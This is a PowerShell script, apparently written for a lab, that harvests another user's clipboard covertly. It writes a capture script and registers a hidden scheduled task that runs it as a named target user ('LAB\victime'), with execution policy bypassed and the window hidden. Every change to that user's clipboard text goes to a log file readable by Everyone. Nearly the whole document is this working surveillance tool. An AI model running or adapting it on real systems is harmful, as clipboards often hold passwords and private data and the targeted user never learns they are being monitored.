# schtask-clipboard.ps1
# Usage : .\schtask-clipboard.ps1 -TargetUser "LAB\victime" [-OutputDir "C:\Lab\harvest"] [-Duration 300] [-Interval 2] [-Timeout 15]

param(
    [Parameter(Mandatory)][string]$TargetUser,
    [string]$OutputDir = "C:\Lab\harvest",
    [string]$TaskName = "MaTaskClipboard",
    [int]$Duration = 300,
    [int]$Interval = 2,
    [int]$Timeout = 15
)

New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
icacls $OutputDir /grant "*S-1-1-0:(OI)(CI)F" | Out-Null

Remove-Item -Path "$OutputDir\clipboard.ps1" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$OutputDir\clipboard.log" -Force -ErrorAction SilentlyContinue
New-Item -Path "$OutputDir\clipboard.log" -ItemType File -Force | Out-Null
icacls "$OutputDir\clipboard.log" /grant "*S-1-1-0:(F)" | Out-Null

Write-Host "[*] Creating clipboard capture script..." -ForegroundColor Cyan
@"
`$outputFile = "$OutputDir\clipboard.log"
`$interval = $Interval
`$duration = $Duration
`$elapsed = 0
`$lastClip = ""

"[*] Clipboard capture started at `$(Get-Date) - duration : `$duration s, interval : `$interval s" | Out-File `$outputFile -Append

`$sta = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace()
`$sta.ApartmentState = [System.Threading.ApartmentState]::STA
`$sta.ThreadOptions = [System.Management.Automation.Runspaces.PSThreadOptions]::ReuseThread
`$sta.Open()

while (`$elapsed -lt `$duration) {
    try {
        `$ps = [System.Management.Automation.PowerShell]::Create()
        `$ps.Runspace = `$sta
        [void]`$ps.AddScript({
            Add-Type -AssemblyName System.Windows.Forms
            [System.Windows.Forms.Clipboard]::GetText()
        })
        `$clip = `$ps.Invoke()[0]
        `$ps.Dispose()

        if (`$clip -and `$clip -ne `$lastClip) {
            "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] New entry :`n`$clip`n---" | Out-File `$outputFile -Append
            `$lastClip = `$clip
        }
    } catch {
        "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [ERROR] `$_" | Out-File `$outputFile -Append
    }
    Start-Sleep -Seconds `$interval
    `$elapsed += `$interval
}

`$sta.Close()
`$sta.Dispose()
"[*] Clipboard capture ended at `$(Get-Date)" | Out-File `$outputFile -Append
"@ | Set-Content -Path "$OutputDir\clipboard.ps1" -Encoding ASCII
icacls "$OutputDir\clipboard.ps1" /grant "*S-1-1-0:(F)" | Out-Null

Write-Host "[*] Creating and starting scheduled task as $TargetUser..." -ForegroundColor Cyan
Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
$settings  = New-ScheduledTaskSettingsSet -Hidden
$action    = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -STA -WindowStyle Hidden -File $OutputDir\clipboard.ps1" -WorkingDirectory $OutputDir
$principal = New-ScheduledTaskPrincipal -UserId $TargetUser -LogonType Interactive -RunLevel Limited
Register-ScheduledTask -TaskName $TaskName -Action $action -Principal $principal -Settings $settings -Force | Out-Null
Start-ScheduledTask -TaskName $TaskName

Write-Host "[*] Capture running for ${Duration}s (interval: ${Interval}s)..." -ForegroundColor Cyan
Write-Host "[*] Monitor : Get-Content $OutputDir\clipboard.log -Wait" -ForegroundColor Cyan

Start-Sleep -Seconds $Timeout
$result = (Get-ScheduledTaskInfo -TaskName $TaskName).LastTaskResult
if ($result -eq 0 -or $result -eq 267009) {
    Write-Host "[+] Task running successfully as $TargetUser" -ForegroundColor Green
    Write-Host "[+] Duration : ${Duration}s | Interval : ${Interval}s" -ForegroundColor Green
    Write-Host "[+] Output : $OutputDir\clipboard.log" -ForegroundColor Green
} else {
    Write-Host "[-] Task failed (LastTaskResult: $result)" -ForegroundColor Red
    Get-Content "$OutputDir\clipboard.log" -ErrorAction SilentlyContinue
}